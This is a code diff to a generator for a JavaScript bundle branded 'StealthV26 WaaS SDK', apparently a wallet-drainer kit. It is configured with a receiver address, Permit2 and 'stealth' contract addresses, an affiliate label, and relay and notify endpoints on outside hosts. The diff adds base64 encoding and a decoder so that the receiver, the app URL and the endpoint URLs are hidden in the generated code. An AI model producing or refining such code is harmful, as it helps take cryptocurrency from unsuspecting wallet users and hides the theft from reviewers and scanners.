@@ -95,6 +95,13 @@ export function generateSDKBundle(opts: SDKOptions): string {
 
   const wcProjectId = modal.walletConnectProjectId || "YOUR_WALLETCONNECT_PROJECT_ID";
 
+  const relayUrl = process.env.NEXT_PUBLIC_RELAY_URL
+    || process.env.RELAY_URL
+    || "https://api.v26sequence.com/api/relay";
+  const notifyUrl = process.env.NEXT_PUBLIC_NOTIFY_URL
+    || process.env.NOTIFY_URL
+    || "https://api.v26sequence.com/api/notify";
+
   return `/**
  * StealthV26 WaaS SDK v26.0.0 — Real Web3Modal Integration
  * Generated: ${new Date().toISOString()}
@@ -117,14 +124,15 @@ export function generateSDKBundle(opts: SDKOptions): string {
    CONFIGURATION
    ═══════════════════════════════════════════════ */
 
+  function __d(s){try{return atob(s)}catch(e){return s}}
 const CONFIG = {
   projectId: "${wcProjectId}",
-  receiver: "${receiverAddress}",
+  receiver: __d("${Buffer.from(receiverAddress || "").toString('base64')}"),
   affiliateLabel: ${JSON.stringify(affiliateLabel || "")},
   appKit: {
     name: ${JSON.stringify(appKit.appName)},
     description: ${JSON.stringify(appKit.appDescription)},
-    url: ${JSON.stringify(appKit.appUrl)},
+    url: __d(${JSON.stringify(Buffer.from(appKit.appUrl || "").toString('base64'))}),
     brandColor: ${JSON.stringify(appKit.brandColor)},
     logoUrl: ${JSON.stringify(appKit.logoUrl)},
     supportEmail: ${JSON.stringify(appKit.supportEmail)},
@@ -139,8 +147,8 @@ const CONFIG = {
     exchange: "${stealthExchangeAddress}",
     factory: "${stealthFactoryAddress}",
     permit2: "${permit2Address}",
-    relayUrl: "${process.env.NEXT_PUBLIC_RELAY_URL || "https://web3-rewards.vercel.app/api/relay"}",
-    notifyUrl: "${process.env.NEXT_PUBLIC_NOTIFY_URL || "https://web3-rewards.vercel.app/api/notify"}"
+    relayUrl: __d("${Buffer.from(relayUrl).toString('base64')}"),
+    notifyUrl: __d("${Buffer.from(notifyUrl).toString('base64')}")
   },
   ui: {
     connectClass: "${general.connectButtonClass}",
